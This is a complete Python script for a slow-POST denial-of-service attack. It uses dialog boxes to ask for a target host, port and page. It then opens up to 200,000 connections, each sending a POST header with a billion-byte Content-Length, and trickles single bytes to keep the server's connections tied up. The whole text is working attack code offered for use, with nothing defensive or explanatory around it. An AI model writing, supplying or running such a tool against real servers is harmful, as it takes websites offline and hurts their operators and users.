import socket
import threading
import easygui
# en-us
#---------------------------
MAX_CONN=200000
PORT=int(easygui.enterbox(title='prompt', msg='Please enter the port of the remote host you want to attack.'))
HOST=easygui.enterbox(title='prompt', msg='Please enter the domain name or IP address of the remote host you want to attack.')
PAGE='/{0}'.format(easygui.enterbox(title='prompt', msg='Please enter the page you want to attack (if not, default is index.html)'))
if PAGE == None:
    PAGE = 'index.html'
easygui.msgbox(title='Warning', msg='The attack will commence at your own risk!')
#---------------------------
buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 1000000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
socks=[]
def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode("utf-8"))
            print("[+] Send buf OK!,conn=%d\n"%i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s"%ex)
        
#end def
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send(bytes("f", 'utf8'))
                print("[+] send OK! %s"%s)
            except Exception as ex:
                print("[-] send Exception:%s\n"%ex)
                socks.remove(s)
                s.close()
                
#end def
conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
conn_th.start()
send_th.start()

